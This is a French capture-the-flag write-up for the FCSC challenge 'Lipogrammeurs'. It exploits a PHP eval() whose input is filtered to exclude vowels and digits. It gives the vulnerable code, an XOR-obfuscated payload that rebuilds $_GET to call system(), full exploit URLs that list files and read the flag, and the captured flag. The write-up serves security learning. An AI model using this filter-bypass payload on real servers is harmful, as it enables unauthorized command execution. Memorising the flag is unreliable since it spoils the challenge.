# <center><b>Lipogrammeurs</b></center>
</br>
<blockquote>Vous avez trouvé cette page qui vous semble étrange. Pouvez-vous nous convaincre qu'il y a effectivement un problème en retrouvant le flag présent sur le serveur ?
</blockquote>

Nous arrivons donc sur une page web ne contenant que ce code php :

```php
     <?php
    if (isset($_GET['code'])) {
        $code = substr($_GET['code'], 0, 250);
        if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
            die('No way! Go away!');
        } else {
            try {
                eval($code);
            } catch (ParseError $e) {
                die('No way! Go away!');
            }
        }
    } else {
        show_source(__FILE__);
    }
```

Le code va vérifier le paramètre que l'on donne à 'code' pour soit retourner une erreur soit executer ce que l'on a mis en paramètre.
<br><br>
On devine alors que la faille se situe au niveau de la fonction eval(), mais on devine aussi que preg_match() va filtrer chaque caractère que l'on va entrer, ce qui va compliquer l'exploitation de la faille.
<br>
Notre payload ne doit donc pas être constitué de voyelles ou encore de nombres.
<br>
J'ai alors utilisé ce payload : 
    
    "";$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);

Ce payload est equivalent à :
    
    $_= '$<>/' ^ '{{{{'; // $_ = '_GET'
    ${_GET}[_](${_GET})[__];
    $_GET[_]($_GET[__])

Après il suffit d’envoyer en GET nos commande comme ceci :  
    
    _=system&__=ls%20-a

Notre lien final devrai donc ressembler à ça :

    http://challenges2.france-cybersecurity-challenge.fr:5008/?code=%22%22;$_=%27$%3C%3E/%27^%27{{{{%27;${$_}[_](${$_}[__]);&_=system&__=ls%20-a

Nous obtenons donc comme réponse 

    . .. .flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php index.php

Tiens, voilà un fichier intéressant, essayons de le lire.

    http://challenges2.france-cybersecurity-challenge.fr:5008/?code=%22%22;$_=%27$%3C%3E/%27^%27{{{{%27;${$_}[_](${$_}[__]);&_=system&__=cat%20.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php

On affiche le code source, et paf notre flag :

    FCSC{53d195522a15aa0ce67954dc1de7c5063174a721ee5aa924a4b9b15ba1ab6948}
